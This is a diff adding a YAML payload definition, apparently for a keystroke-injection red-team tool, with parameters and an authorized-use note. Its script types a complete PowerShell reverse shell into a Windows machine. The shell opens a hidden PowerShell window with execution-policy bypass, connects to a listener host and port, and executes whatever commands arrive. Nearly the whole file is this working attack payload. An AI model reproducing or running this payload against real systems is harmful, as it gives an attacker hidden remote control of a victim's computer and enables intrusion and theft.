@@ -1,0 +1,59 @@
+name: reverse-shell
+description: "Establishes a PowerShell reverse shell connection to a specified host and port"
+author: TiltedLunar123
+version: "1.0"
+mitre:
+  tactic: Execution
+  technique: T1059.001
+platform: windows
+parameters:
+  - name: lhost
+    type: string
+    default: "127.0.0.1"
+    description: "Listener IP address to connect back to"
+  - name: lport
+    type: integer
+    default: 4444
+    description: "Listener port number to connect back to"
+  - name: delay_ms
+    type: integer
+    default: 500
+    description: "Delay in milliseconds between keystrokes"
+safety:
+  requires_confirmation: true
+  scope_note: "Only use on systems you own or have written authorization to test"
+script: |
+  REM -----------------------------------------------
+  REM PowerShell Reverse Shell (T1059.001)
+  REM Opens a reverse TCP connection back to the
+  REM specified listener host and port
+  REM WARNING: Authorized use only
+  REM -----------------------------------------------
+  DELAY 3000
+  DELAY {{ delay_ms }}
+  GUI r
+  DELAY 500
+  STRING powershell -w hidden -ep bypass
+  ENTER
+  DELAY 500
+  DELAY {{ delay_ms }}
+  STRING $client = New-Object System.Net.Sockets.TCPClient('{{ lhost }}', {{ lport }});
+  ENTER
+  DELAY {{ delay_ms }}
+  STRING $stream = $client.GetStream();
+  ENTER
+  DELAY {{ delay_ms }}
+  STRING $writer = New-Object System.IO.StreamWriter($stream);
+  ENTER
+  DELAY {{ delay_ms }}
+  STRING $buffer = New-Object System.Byte[] 1024;
+  ENTER
+  DELAY {{ delay_ms }}
+  STRING $encoding = New-Object System.Text.ASCIIEncoding;
+  ENTER
+  DELAY {{ delay_ms }}
+  STRING while($true){$writer.Write('PS ' + (pwd).Path + '> ');$writer.Flush();$read = $stream.Read($buffer,0,1024);$cmd = $encoding.GetString($buffer,0,$read).Trim();if($cmd -eq 'exit'){break};$result = (Invoke-Expression $cmd 2>&1 | Out-String);$writer.Write($result);$writer.Flush()}
+  ENTER
+  DELAY {{ delay_ms }}
+  STRING $client.Close();
+  ENTER
